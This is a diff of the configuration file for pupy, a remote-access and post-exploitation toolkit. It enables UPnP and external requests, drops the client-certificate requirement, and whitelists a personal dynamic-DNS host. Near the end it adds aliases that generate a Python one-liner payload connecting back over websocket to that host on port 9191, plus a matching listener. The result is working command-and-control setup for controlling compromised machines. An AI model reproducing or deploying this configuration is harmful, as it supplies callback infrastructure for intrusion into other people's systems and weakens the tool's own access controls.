@@ -22,7 +22,7 @@ listen = ssl
 #    add mappings to your local machine from outside
 #If enabled, pupy will implicitly expect that pupysh sits behind NAT
 #igd = http://ip[:port] will disable autodetect
-igd = false
+igd = true
 
 #httpd=true wraps your transport in a HTTP transport.
 httpd = false
@@ -33,7 +33,7 @@ recursor = false
 
 # allow requests to services like ifconfig.co to automatically retrieve public IP
 # you should enable this if you planning to use IGD/UPNP
-allow_requests_to_external_services = false
+allow_requests_to_external_services = true
 
 use_gnome_keyring=false
 
@@ -80,7 +80,7 @@ http = 80=8080
 ecm = 1235
 
 [ssl]
-client_cert_required = true
+client_cert_required = false
 
 [httpd]
 log = true
@@ -101,12 +101,12 @@ static_webroot_uri =
 preserve_payloads = false
 # Set this to the comma delimited list of ips/domain names
 # which allowed to connect to "local ips"
-# local_ips = localhost
+local_ips = localhost,faust.synology.me
 
 [gen]
 format = client
-os = windows
-arch = x86
+os = linux
+arch = x64
 external = false
 #The command used for packing the 'client' output format (incompatible with py, pyinst, py_oneliner, ps1, ps1_oneliner, rubber_ducky for example)
 packer =
@@ -160,7 +160,7 @@ any1 = !notify-send "New session: {hostname} / {os_name}"
 [default_viewers]
 image_viewer = eog
 sound_player = totem
-browser = firefox
+browser = brave-browser
 xdg_open = xdg-open
 
 [mimikatz]
@@ -188,6 +188,8 @@ kill = process_kill
 #tasklist = shell_exec 'tasklist /v'
 mount = drives
 du = download -S
+oneliner = gen -f py_oneliner connect -t ws --host faust.synology.me:9191 path=/dead
+liste-ws = listen -A ws 9191 path=/dead
 
 [rubber_ducky]
 #path to the encoder.jar file of Rubber-Ducky project (see https://github.com/hak5darren/USB-Rubber-Ducky/blob/master/Encoder/encoder.jar)
